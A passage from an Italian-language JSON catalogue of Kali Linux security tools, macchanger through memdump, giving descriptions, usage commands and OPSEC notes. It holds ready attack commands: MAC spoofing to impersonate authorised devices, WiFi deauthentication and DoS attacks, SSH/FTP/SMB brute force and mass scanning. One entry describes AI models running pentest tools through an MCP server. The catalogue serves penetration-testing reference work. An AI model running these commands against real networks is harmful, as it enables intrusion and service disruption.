    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Macchanger</strong> è un utility GNU/Linux per modificare (spoofing) il MAC address delle interfacce di rete. Il MAC address è l'identificatore hardware univoco assegnato dal produttore a ogni scheda di rete. Macchanger permette di cambiarlo temporaneamente per vari scopi: anonimato su reti WiFi pubbliche, bypass di filtri MAC-based, impersonazione di dispositivi autorizzati, o testing di controlli di sicurezza. Include un database di OUI (Organizationally Unique Identifier) per generare MAC credibili che corrispondono a vendor specifici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Random MAC Generation:</strong> Genera un MAC address completamente casuale. I primi 3 byte (OUI) possono essere casuali o selezionati da vendor noti per apparire come un dispositivo legittimo invece che un address palesemente spoofed.</p><p><strong>Vendor-Specific Spoofing:</strong> Utilizza il database interno di OUI per generare MAC che corrispondono a specifici produttori. Può imitare dispositivi Apple, HP, Cisco, o qualsiasi vendor. Utile per apparire come un tipo specifico di device sulla rete.</p><p><strong>Custom MAC Setting:</strong> Permette di impostare un MAC address specifico. Essenziale per impersonare un dispositivo autorizzato di cui si conosce il MAC, o per replicare la configurazione di un altro sistema.</p><p><strong>Persistent Original Storage:</strong> Memorizza il MAC originale dell'interfaccia, permettendo di ripristinarlo facilmente. Questo è utile per tornare alla configurazione originale senza dover cercare il MAC hardware reale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'interfaccia deve essere disattivata prima di modificare il MAC.</p><pre><code># === WORKFLOW COMPLETO ===\n# 1. Disattiva l'interfaccia\nsudo ip link set eth0 down\n\n# 2. Cambia MAC\nsudo macchanger -r eth0  # random\n\n# 3. Riattiva l'interfaccia\nsudo ip link set eth0 up\n\n# === TIPI DI SPOOFING ===\n# MAC completamente random\nsudo macchanger -r eth0\n\n# MAC random ma con OUI di vendor reale (più credibile)\nsudo macchanger -a eth0\n\n# MAC random dello stesso vendor originale\nsudo macchanger -e eth0\n\n# MAC specifico\nsudo macchanger -m 00:11:22:33:44:55 eth0\n\n# === VENDOR-SPECIFIC ===\n# Lista vendor disponibili\nmacchanger -l | grep -i \"apple\"\nmacchanger -l | grep -i \"cisco\"\n\n# === INFO E RESTORE ===\n# Mostra MAC corrente e originale\nmacchanger -s eth0\n\n# Ripristina MAC originale\nsudo macchanger -p eth0\n\n# === AUTOMAZIONE ===\n# Script per cambio automatico al boot\n# In /etc/network/if-pre-up.d/macchanger\n#!/bin/bash\nmacchanger -r $IFACE</code></pre><p>Il cambio MAC è temporaneo e persiste solo fino al reboot o al ripristino esplicito.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privacy su WiFi Pubblici</strong>, cambiare MAC prima di connettersi a reti pubbliche (aeroporti, hotel, caffè) impedisce il tracking basato su MAC address. I sistemi di analytics WiFi usano spesso i MAC per tracciare i movimenti degli utenti.</p><p>Nel <strong>Bypass di Filtri MAC</strong>, alcune reti usano whitelist di MAC address per controllare l'accesso. Se si conosce il MAC di un dispositivo autorizzato (tramite sniffing), si può impersonarlo per ottenere accesso.</p><p>Per <strong>NAC/802.1X Testing</strong>, permette di testare l'efficacia dei controlli di accesso alla rete. Se la sicurezza si basa solo su MAC filtering senza autenticazione forte (802.1X con certificati), il bypass è triviale.</p><p>Durante <strong>Red Team Operations</strong>, apparire come un dispositivo diverso può aiutare l'evasione: un laptop attaccante può apparire come una stampante HP o un telefono IP Cisco per evitare sospetti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Solo Layer 2:</strong> Lo spoofing MAC è efficace solo sulla rete locale. Una volta che il traffico passa attraverso un router, il MAC originale non è più visibile. Per anonimato internet, serve anche VPN o Tor.</p><p><strong>Switch Logging:</strong> Switch managed possono loggare i MAC address visti su ogni porta. Un cambio MAC improvviso o MAC duplicati possono generare alert in ambienti monitorati.</p><p><strong>DHCP Fingerprinting:</strong> I server DHCP possono fingerprint i client basandosi su opzioni richieste, non solo MAC. Cambiare MAC senza modificare il comportamento DHCP può essere rilevato come anomalo.</p><p><strong>802.1X Limitation:</strong> MAC spoofing non bypassa 802.1X con autenticazione EAP-TLS (certificati) o PEAP. Questi sistemi richiedono credenziali valide indipendentemente dal MAC.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "maltego",
    "name": "maltego",
    "version": "4.10.1",
    "icon": "../app/icons/maltego-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/maltego/",
    "desc": "Piattaforma OSINT con graph visualization per mappare relazioni tra entità e target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Maltego</strong> è la piattaforma leader per OSINT e link analysis. Visualizza relazioni tra entità (persone, aziende, domini, IP, social) in graph interattivi. I Transform automatizzano la raccolta dati da centinaia di fonti. Essenziale per investigazioni e threat intelligence.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Graph Visualization:</strong> Mappa relazioni visivamente.</p><p><strong>Transforms:</strong> 400+ data source integrati.</p><p><strong>Entities:</strong> Persone, domini, IP, email, social.</p><p><strong>Collaboration:</strong> Team workspace condivisi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Maltego\nmaltego\n\n# Workflow tipico:\n# 1. New Graph\n# 2. Aggiungi entità iniziale (domain, email, persona)\n# 3. Right-click -> Run Transform\n# 4. Seleziona data source (WHOIS, DNS, Shodan)\n# 5. Analizza relazioni nel graph\n# 6. Espandi con ulteriori transform</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, investigazioni su persone e aziende.</p><p>Nel <strong>Threat Intel</strong>, mappa infrastrutture malevole.</p><p><strong>Fraud Investigation</strong> per seguire collegamenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dipende dai transform:</strong> Alcuni sono passivi (WHOIS cache), altri attivi. API key possono loggare query. Versione CE ha limitazioni.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "maryam",
    "name": "maryam",
    "version": "2.5.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/maryam/",
    "desc": "Framework OSINT modulare con 50+ moduli per recon: DNS, email, social, metadata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Maryam</strong> è un framework OSINT modulare open-source scritto in Python, progettato per automatizzare e organizzare le attività di raccolta informazioni. Con oltre 50 moduli indipendenti, copre DNS enumeration, email harvesting, social media reconnaissance, metadata extraction, credential leak search, e molto altro. L'interfaccia CLI interattiva, ispirata a Metasploit, permette di gestire sessioni, configurare target, eseguire moduli e generare report in modo strutturato ed efficiente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Architettura Modulare:</strong> Ogni modulo è indipendente e focalizzato su una specifica fonte o tecnica OSINT. I moduli sono organizzati in categorie (osint, footprint, search) e possono essere combinati in workflow personalizzati. Nuovi moduli possono essere aggiunti facilmente.</p><p><strong>Multi-Source Intelligence:</strong> Interroga simultaneamente decine di fonti: motori di ricerca (Google, Bing, DuckDuckGo), database di leak (HaveIBeenPwned), social network (LinkedIn, Twitter), archivi web (Wayback Machine), e servizi DNS (SecurityTrails, VirusTotal).</p><p><strong>Session Management:</strong> Mantiene lo stato tra le esecuzioni, permettendo di riprendere ricerche interrotte, aggregare risultati da moduli diversi, e costruire profili completi di target nel tempo.</p><p><strong>Flexible Reporting:</strong> Esporta i risultati in JSON, XML, CSV, e HTML. I report HTML includono visualizzazioni grafiche delle relazioni tra le entità scoperte.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Maryam offre una shell interattiva con comandi simili a Metasploit.</p><pre><code># Avvia la shell Maryam\nmaryam\n\n# Mostra tutti i moduli disponibili\nshow modules\n\n# Cerca moduli per keyword\nsearch dns\n\n# Usa un modulo per DNS enumeration\nuse osint/dns_search\nset DOMAIN target.com\nrun\n\n# Harvesting email\nuse osint/email_search\nset DOMAIN target.com\nset LIMIT 100\nrun\n\n# Social media reconnaissance\nuse osint/social_nets\nset QUERY \"John Doe\"\nrun\n\n# Genera report HTML\nreport html output.html\n\n# Esegui moduli in batch\nmaryam -e \"use osint/dns_search; set DOMAIN target.com; run\"</code></pre><p>I risultati di ogni modulo vengono salvati nella sessione corrente e possono essere esportati o usati come input per altri moduli.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT Investigation</strong>, Maryam fornisce un framework organizzato per condurre ricerche su persone, organizzazioni, o infrastrutture, aggregando dati da fonti multiple in un unico ambiente.</p><p>Durante la fase di <strong>Reconnaissance</strong> in penetration testing, automatizza l'enumeration di subdomain, email, tecnologie web, e altri asset che possono diventare vettori di attacco.</p><p>Per <strong>Threat Intelligence</strong>, permette di monitorare leak di credenziali, presenza di dati aziendali su paste site, e attività sui social media correlate a minacce.</p><p>In contesti di <strong>Due Diligence e Background Check</strong>, aiuta a costruire profili informativi su soggetti di interesse aggregando informazioni pubblicamente disponibili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il profilo di rischio varia per modulo. Moduli che usano API di motori di ricerca sono passivi. Moduli che eseguono DNS query attive o interagiscono direttamente con i target possono lasciare tracce.</p><p><strong>Rate Limiting:</strong> Molte fonti (Google, LinkedIn, HaveIBeenPwned) implementano rate limiting. Ricerche aggressive possono causare blocchi temporanei o permanenti degli IP. Usare delay e proxy rotation.</p><p><strong>API Keys:</strong> Alcuni moduli richiedono API key per funzionalità complete (Shodan, VirusTotal, SecurityTrails). Configurare le chiavi nel file di configurazione per risultati ottimali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "masscan",
    "name": "masscan",
    "version": "1.3.2",
    "icon": "../app/icons/masscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/masscan/",
    "desc": "Port scanner più veloce al mondo, scansiona l'intero internet in pochi minuti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Masscan</strong> è il port scanner più veloce esistente, capace di scansionare l'intero internet in meno di 6 minuti. Usa stack TCP/IP custom e trasmissione asincrona per raggiungere 10+ milioni di pacchetti/secondo. Output compatibile con Nmap per integrazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Velocità:</strong> 10M+ pacchetti/secondo.</p><p><strong>Scalabilità:</strong> Scansiona range enormi.</p><p><strong>Custom Stack:</strong> Bypass del kernel per performance.</p><p><strong>Nmap Compatible:</strong> Output XML/grepable.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan veloce di subnet\nmasscan 192.168.0.0/16 -p80,443 --rate 10000\n\n# Range di porte\nmasscan 10.0.0.0/8 -p1-65535 --rate 100000\n\n# Output Nmap compatible\nmasscan 192.168.1.0/24 -p1-1000 -oX scan.xml\n\n# Esclusione range\nmasscan 0.0.0.0/0 -p443 --exclude 10.0.0.0/8</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Large Scale Recon</strong>, scansione di internet o grandi range.</p><p>Nel <strong>Asset Discovery</strong>, trova tutti i servizi esposti.</p><p><strong>Bug Bounty</strong> per scope ampi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Estremamente Rumoroso:</strong> Milioni di pacchetti visibili. Facilmente bannato. Può saturare connessione. Usare rate limiting e --exclude per IP sensibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "massdns",
    "name": "massdns",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/massdns/",
    "desc": "DNS resolver ad alte prestazioni per risolvere milioni di domini in parallelo.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MassDNS</strong> è un resolver DNS ad altissime prestazioni. Risolve milioni di domini usando stub resolver multipli in parallelo. Perfetto per validare output di subdomain enumeration o risolvere grandi liste di potenziali subdomain generati con wordlist.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Performance:</strong> 350k+ risoluzioni/secondo.</p><p><strong>Multi-resolver:</strong> Usa server DNS multipli.</p><p><strong>Reliable:</strong> Retry automatici per failure.</p><p><strong>Flexible Output:</strong> JSON, simple, etc.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Risolvi lista di subdomain\nmassdns -r resolvers.txt -t A domains.txt -o S > results.txt\n\n# Con output JSON\nmassdns -r resolvers.txt -t A domains.txt -o J > results.json\n\n# Pipeline con sublist3r\nsublist3r -d target.com -o subs.txt\nmassdns -r resolvers.txt -t A subs.txt -o S\n\n# Resolver pubblici\nmassdns -r /usr/share/massdns/lists/resolvers.txt domains.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Subdomain Validation</strong>, verifica quali subdomain esistono.</p><p>Nel <strong>Bug Bounty</strong>, risoluzione rapida di grandi liste.</p><p><strong>Asset Discovery</strong> su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alto volume DNS:</strong> Molte query a resolver pubblici. Pattern riconoscibile. Possibile rate limiting. Usa resolver diversificati e attendibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "mcp-kali-server",
    "name": "mcp-kali-server",
    "version": "0.0~git20250407.df99f04",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mcp-kali-server/",
    "desc": "Server MCP per integrare tool Kali con LLM AI per automazione pentest assistita.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>MCP Kali Server implementa il Model Context Protocol per integrare tool Kali Linux con Large Language Models. Permette a AI assistant di eseguire tool di security, analizzare output, e guidare penetration test in modo conversazionale e assistito.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MCP Protocol:</strong> Integrazione standard con LLM.</p><p><strong>Tool Execution:</strong> Esegue tool Kali via AI.</p><p><strong>Context Aware:</strong> AI comprende output.</p><p><strong>Conversational:</strong> Pentest guidato da chat.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia MCP server\nmcp-kali-server\n\n# Configura client MCP (Claude, etc.)\n# L'AI può ora richiedere:\n\"Run nmap scan on 192.168.1.1\"\n\"Enumerate SMB shares on target\"\n\"Search for vulnerabilities on port 80\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AI-Assisted Pentest</strong>, guida conversazionale.</p><p>Nel <strong>Learning</strong>, AI spiega ogni step.</p><p><strong>Automation</strong> di workflow di security.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Come tool sottostanti:</strong> AI può lanciare scan attivi. Verificare sempre prima di eseguire. Output può contenere dati sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "AI_MCP"
    ],
    "notes": null
  },
  {
    "id": "mdk3",
    "name": "mdk3",
    "version": "6.0",
    "icon": "../app/icons/mdk3-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mdk3/",
    "desc": "Exploit WiFi per beacon flooding, authentication DoS e SSID bruteforce.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MDK3</strong> è un tool storico per exploitation e stress testing di reti wireless 802.11. Implementa una suite completa di attacchi contro infrastrutture WiFi: beacon flooding per creare centinaia di access point fake, authentication DoS per esaurire le risorse degli AP, deauthentication per disconnettere forzatamente i client, probing attack per scoprire SSID nascosti, e attacchi EAPOL per ambienti enterprise. Scritto in C per massime performance, MDK3 è stato per anni il tool di riferimento per security assessment wireless. Il successore MDK4 aggiunge supporto per 802.11w ma MDK3 rimane preferito per compatibilità con hardware e driver legacy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Beacon Flood Mode (b):</strong> Genera migliaia di beacon frame con SSID fake, creando centinaia di access point fantasma visibili ai client. Può saturare la lista WiFi dei dispositivi circostanti e testare come AP e client gestiscono ambienti ad alta densità.</p><p><strong>Authentication DoS Mode (a):</strong> Invia flood di authentication request all'access point target. Gli AP hanno risorse limitate per gestire autenticazioni simultanee; questo attacco può causare denial of service bloccando connessioni legittime.</p><p><strong>Deauthentication Mode (d):</strong> Invia frame di deauthentication spoofando l'indirizzo MAC dell'AP, forzando la disconnessione dei client. Prerequisito per attacchi evil twin e cattura handshake WPA.</p><p><strong>SSID Probing Mode (p):</strong> Scopre SSID nascosti (non broadcast) inviando probe request con wordlist di nomi comuni. Quando un AP con SSID nascosto riceve probe per il suo SSID, risponde rivelando la sua presenza.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MDK3 richiede interfaccia wireless in monitor mode. Ogni attack mode è identificato da una lettera.</p><pre><code># Prerequisito: monitor mode\nairmon-ng start wlan0\n\n# BEACON FLOODING - crea fake AP con SSID da file\nmdk3 wlan0mon b -f ssid_list.txt -c 6\n# -c specifica il canale, -f file con lista SSID\n\n# BEACON FLOODING - genera SSID random\nmdk3 wlan0mon b -c 6 -s 256\n# -s lunghezza SSID random\n\n# AUTHENTICATION DOS\nmdk3 wlan0mon a -a 00:11:22:33:44:55\n# -a MAC address dell'AP target\n\n# AUTHENTICATION DOS - tutti gli AP visibili\nmdk3 wlan0mon a\n\n# DEAUTHENTICATION - client specifico\nmdk3 wlan0mon d -b blacklist.txt -c 6\n# blacklist.txt contiene MAC dei client da disconnettere\n\n# DEAUTHENTICATION - tutti i client su un canale\nmdk3 wlan0mon d -c 6\n\n# SSID PROBING - scopri hidden SSID\nmdk3 wlan0mon p -f ssid_wordlist.txt -c 6\n\n# MICHAEL SHUTDOWN - attacco specifico TKIP\nmdk3 wlan0mon m -t 00:11:22:33:44:55\n# Causa MIC failure e temporaneo shutdown AP TKIP</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Wireless Penetration Testing</strong>, MDK3 è usato per testare la resilienza dell'infrastruttura WiFi. Gli attacchi DoS verificano se gli AP mantengono disponibilità sotto stress e se sistemi di backup intervengono correttamente.</p><p>Per <strong>WIDS/WIPS Testing</strong>, gli attacchi MDK3 sono specificamente progettati per triggerare alert in sistemi di detection wireless. Verifica che il WIDS rilevi beacon flooding, deauth attack, e altri comportamenti malevoli.</p><p>Nel <strong>Red Team Physical Assessment</strong>, il deauthentication attack forza client a riconnettersi, prerequisito per attacchi evil twin dove un fake AP cattura credenziali di ignari utenti che si riconnettono all'AP malevolo.</p><p>Per <strong>Hidden SSID Discovery</strong>, il probing mode è il metodo più efficace per identificare reti wireless con SSID nascosto, security through obscurity facilmente bypassabile.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità Critica:</strong> Attacchi DoS contro reti wireless sono reati penali in quasi tutte le giurisdizioni. L'uso non autorizzato può comportare conseguenze legali severe. Utilizzare ESCLUSIVAMENTE in laboratori isolati o con autorizzazione scritta esplicita dal proprietario della rete.</p><p><strong>Impatto Collaterale:</strong> Gli attacchi wireless influenzano inevitabilmente reti circostanti. Beacon flooding e deauth su canali comuni disturbano tutte le reti nelle vicinanze, non solo il target. In ambienti reali, impossibile limitare l'impatto al solo target.</p><p><strong>Detection Immediata:</strong> Sistemi WIDS enterprise (Cisco, Aruba, Mist) rilevano immediatamente questi attacchi con alert ad alta priorità. L'attività viene loggata e l'interfaccia attaccante può essere localizzata fisicamente tramite triangolazione.</p><p><strong>Obsolescenza Parziale:</strong> Con 802.11w (Protected Management Frames) e WPA3, deauthentication attack sono mitigati. Per reti moderne, considerare MDK4 che implementa tecniche di bypass PMF.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "mdk4",
    "name": "mdk4",
    "version": "4.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mdk4/",
    "desc": "Evoluzione di mdk3 con attacchi WiFi moderni: PMKID, 802.11w bypass, WPA3 DoS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>MDK4</strong> è l'evoluzione del celebre MDK3, aggiornato per supportare attacchi contro le protezioni WiFi moderne. La principale innovazione è il supporto per il bypass di 802.11w (Protected Management Frames/PMF), la tecnologia progettata per proteggere contro attacchi di deauthentication. Include inoltre attacchi specifici per WPA3, cattura PMKID senza necessità di client connessi, e tutti gli attacchi legacy di MDK3 con performance migliorate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>802.11w PMF Bypass:</strong> La feature più significativa. Protected Management Frames dovrebbe impedire deauth attacks, ma MDK4 implementa tecniche per bypassare o degradare questa protezione in determinate configurazioni, rendendo ancora possibili attacchi DoS su reti \"protette\".</p><p><strong>WPA3 Attack Vectors:</strong> Include attacchi specifici contro WPA3: denial of service durante SAE handshake, attacchi di downgrade per forzare fallback a WPA2, e fuzzing del protocollo per identificare vulnerabilità implementative.</p><p><strong>PMKID Capture:</strong> Può catturare PMKID (Pairwise Master Key Identifier) direttamente dall'Access Point senza necessità che client siano connessi, accelerando il processo di cracking WPA2/WPA3-PSK.</p><p><strong>Enhanced Classic Attacks:</strong> Tutti gli attacchi MDK3 (beacon flooding, authentication DoS, deauthentication, EAPOL logoff) sono stati ottimizzati per maggiore efficacia e velocità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>MDK4 richiede un'interfaccia wireless in monitor mode e privilegi root.</p><pre><code># Metti interfaccia in monitor mode\nairmon-ng start wlan0\n\n# Beacon Flooding - crea centinaia di fake AP\nmdk4 wlan0mon b -f ssids.txt -c 6\n\n# Deauthentication con bypass 802.11w\nmdk4 wlan0mon d -B -c 6\n\n# Deauth su AP specifico\nmdk4 wlan0mon d -B -c 6 -b target_ap.txt\n\n# Authentication DoS (flood di auth requests)\nmdk4 wlan0mon a -a 00:11:22:33:44:55 -m\n\n# EAPOL Start flooding\nmdk4 wlan0mon e -t 00:11:22:33:44:55\n\n# PMKID capture (combinato con deauth per forzare reconnection)\nmdk4 wlan0mon d -B -c 6 -a AP_MAC\n# Poi usare hcxdumptool per catturare PMKID</code></pre><p>La modalità -B è il flag chiave per attivare il bypass di 802.11w dove possibile.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Security Assessment</strong>, MDK4 è essenziale per testare la resilienza delle reti wireless enterprise contro attacchi DoS, verificando che 802.11w e WPA3 siano correttamente implementati.</p><p>Durante <strong>Red Team Engagement</strong>, può essere usato per forzare la disconnessione di client specifici, facilitando attacchi di evil twin o credential capture.</p><p>Per <strong>Security Research</strong>, il fuzzing di protocolli WPA3 e la verifica di implementazioni PMF rivelano vulnerabilità in firmware e driver di AP e client.</p><p>Nel <strong>Penetration Testing</strong> wireless, il beacon flooding e auth DoS testano la stabilità dell'infrastruttura e l'efficacia di WIPS/WIDS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> Gli attacchi DoS contro reti wireless sono illegali nella maggior parte delle giurisdizioni. L'uso non autorizzato può costituire reato penale. Utilizzare ESCLUSIVAMENTE in ambienti di laboratorio isolati o con autorizzazione scritta esplicita.</p><p><strong>Impatto:</strong> Può causare denial of service a reti critiche (ospedali, sistemi industriali) con conseguenze potenzialmente gravi. Il beacon flooding può saturare lo spettro radio influenzando reti adiacenti.</p><p><strong>Rilevamento:</strong> Sistemi WIPS enterprise (Cisco, Aruba) rilevano e segnalano questi attacchi. L'attività è registrata e l'interfaccia attaccante può essere geolocalizzata.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "medusa",
    "name": "medusa",
    "version": "2.3",
    "icon": "../app/icons/medusa-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/medusa/",
    "desc": "Brute forcer parallelo e modulare per autenticazione su servizi di rete multipli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Medusa</strong> è un brute forcer parallelo, modulare e veloce per autenticazione di rete. Supporta molti protocolli inclusi SSH, FTP, HTTP, SMB, RDP, MySQL, PostgreSQL, VNC, e altri. Design modulare permette aggiunta di nuovi protocolli facilmente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Modular:</strong> Protocolli come moduli separati.</p><p><strong>Parallel:</strong> Thread multipli per velocità.</p><p><strong>Combo Files:</strong> Username:password preformattati.</p><p><strong>Resume:</strong> Riprende sessioni interrotte.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SSH brute force\nmedusa -h target.com -u admin -P passwords.txt -M ssh\n\n# Con lista utenti\nmedusa -h target.com -U users.txt -P pass.txt -M ssh\n\n# FTP\nmedusa -h target.com -u admin -P pass.txt -M ftp\n\n# Multiple hosts\nmedusa -H hosts.txt -U users.txt -P pass.txt -M smb</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Password Audit</strong>, test di credenziali deboli.</p><p>Nel <strong>Pentesting</strong>, brute force servizi.</p><p><strong>Security Assessment</strong> di policy password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> Migliaia di login attempt. Account lockout. Facilmente rilevabile da IDS. Usare -t per limitare thread e -T per timeout.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "memdump",
    "name": "memdump",
    "version": "1.01",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/memdump/",
    "desc": "Dump della memoria fisica di un sistema Linux per analisi forense e ricerca chiavi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Memdump</strong> è un tool di acquisizione forense per creare dump della memoria fisica (RAM) di sistemi Linux. Legge direttamente da /dev/mem o /dev/fmem per estrarre l'intero contenuto della memoria volatile in formato raw. La memoria RAM contiene informazioni critiche non presenti su disco: chiavi di crittografia in uso (LUKS, VeraCrypt, BitLocker), password in chiaro di sessioni attive, processi e moduli kernel caricati, artefatti di malware fileless, e connessioni di rete attive. L'acquisizione della memoria è un passo fondamentale nell'analisi forense e incident response, poiché queste informazioni vengono perse irreversibilmente allo spegnimento del sistema.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Physical Memory Access:</strong> Accede direttamente alla memoria fisica tramite /dev/mem o /dev/fmem (kernel module). Bypassa le astrazioni del sistema operativo per ottenere una vista raw della RAM inclusi kernel space e hardware-mapped regions.</p><p><strong>Fast Acquisition:</strong> Dump veloce con overhead minimo. La velocità è critica in forensics per catturare uno snapshot consistente prima che i dati cambino. Throughput limitato solo dalla velocità di I/O del media di destinazione.</p><p><strong>Raw Binary Format:</strong> Output in formato binario grezzo compatibile con tutti i tool di analisi forense: Volatility, Rekall, bulk_extractor. Nessuna manipolazione o compressione dei dati.</p><p><strong>Minimal System Impact:</strong> Tool leggero che non installa driver o modifica il sistema. L'unico effetto è la lettura della memoria, preservando l'integrità forense del sistema sotto analisi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Memdump richiede privilegi root per accedere a /dev/mem.</p><pre><code># Dump completo della memoria fisica\nsudo memdump > /mnt/external/memory.raw\n\n# Dump con offset e lunghezza specifici\nsudo memdump -b 0x1000 -l 0x10000000 > partial.raw\n\n# Verifica integrità con hash\nsudo memdump | tee memory.raw | sha256sum > memory.sha256\n\n# Analisi immediata con strings per quick wins\nstrings memory.raw | grep -iE 'password|secret|key|token'\n\n# Ricerca pattern specifici\nstrings memory.raw | grep -E '[A-Za-z0-9+/]{40,}={0,2}' # Base64\n\n# Analisi con Volatility 2\nvol.py -f memory.raw --profile=LinuxUbuntu2004x64 linux_pslist\nvol.py -f memory.raw --profile=LinuxUbuntu2004x64 linux_bash\nvol.py -f memory.raw --profile=LinuxUbuntu2004x64 linux_netstat\n\n# Analisi con Volatility 3\nvol3 -f memory.raw linux.pslist\nvol3 -f memory.raw linux.bash.Bash\n\n# Estrazione bulk di artefatti\nbulk_extractor -o output_dir memory.raw</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Digital Forensics</strong>, il memory dump è uno dei primi step nell'acquisizione di evidenze. La memoria contiene informazioni non reperibili altrove: processi terminati recentemente, connessioni di rete chiuse, e dati di applicazioni non ancora scritti su disco.</p><p>Nel <strong>Incident Response</strong>, quando si risponde a una compromissione, il dump della memoria cattura lo stato del malware in esecuzione: codice, configurazioni, chiavi C2, e credential raccolte. Essenziale per comprendere cosa ha fatto l'attaccante.</p><p>Per <strong>Encryption Key Recovery</strong>, quando si deve accedere a volumi criptati su sistemi live, le chiavi di cifratura sono in memoria. Tool come aeskeyfind e findaes possono estrarre chiavi AES dal dump permettendo decryption dei volumi.</p><p>Nell'<strong>Analisi Malware</strong>, malware fileless e packed binaries esistono solo in memoria. Il dump permette di estrarre codice unpacked, configuration 